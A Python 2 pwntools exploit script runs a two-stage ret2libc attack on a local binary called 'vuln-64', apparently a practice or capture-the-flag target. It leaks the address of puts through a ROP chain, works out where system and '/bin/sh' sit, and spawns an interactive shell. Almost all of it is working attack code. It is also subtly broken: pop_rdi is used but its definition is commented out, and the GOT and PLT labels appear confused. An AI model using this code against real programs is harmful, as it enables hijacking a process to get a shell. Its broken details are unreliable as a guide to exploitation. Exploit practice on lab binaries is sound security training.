#!/usr/bin/env python2

from pwn import *

offset = 616

# exploitation Phase 1
# get a leak by running the overflow calling puts() and returning to main()
# the output will leak the real address of puts() after procecure linking 
addr_main =    (0x0000000000401167)
addr_puts =    (0x0000000000401030)
addr_puts_plt= (0x0000000000404000)
#pop_rdi=       (0x00000000004005e3)  # This needs to be compiled on other platfrom: with kali there is no pop rdi in the executable code...
#                                     # Libc can't be used since ASLR is enabled.
addr_ret=      (0x0000000000401016)

payload = b"A"*offset
payload += p64(pop_rdi)
payload += p64(addr_puts_plt)
payload += p64(addr_ret)
payload += p64(addr_puts)
payload += p64(addr_main)

r = process('./vuln-64')
r.sendline(payload)
output = r.recvline()
output = r.recvline()
print output # = r.recvline()
leak = u64(output.strip("\n").ljust(8, "\x00"))
log.info('puts@libc is at: {}'.format(hex(leak))) # The leaked value is printed.

#gdb-peda$ p puts
#$4 = {int (const char *)} 0x7f5622089820 <__GI__IO_puts>
#gdb-peda$ p system
#$5 = {int (const char *)} 0x7f562205e330 <__libc_system>
#gdb-peda$ p exit
#$6 = {void (int)} 0x7f5622050590 <__GI_exit>
#gdb-peda$ find "/bin/sh" 0x00007f5622012000 0x00007f56221e6000
#Searching for '/bin/sh' in range: 0x7f5622012000 - 0x7f56221e6000
#Found 1 results, display max 1 items:
#libc.so.6 : 0x7f56221a8031 --> 0x68732f6e69622f ('/bin/sh')

offset_system = 0x7f5622089820 - 0x7f562205e330
offset_exit = 0x7f5622089820 - 0x7f5622050590
offset_binsh =  0x7f56221a8031 - 0x7f5622089820

addr_system = leak - offset_system
addr_binsh = leak + offset_binsh
addr_exit = leak - offset_exit

payload = b"A"*offset
payload += p64(pop_rdi)
payload += p64(addr_binsh)
# alignemtn not needed ... (why?)
#payload += p64(addr_ret)
payload += p64(addr_system)
payload += p64(addr_exit)


log.info('system@libc is at: {}'.format(hex(addr_system))) # The leaked value is printed.
log.info('exit@libc is at: {}'.format(hex(addr_exit))) # The le
log.info('binsh@libc is at: {}'.format(hex(addr_binsh))) # The leaked value is printed.

r.sendline(payload)
r.interactive()
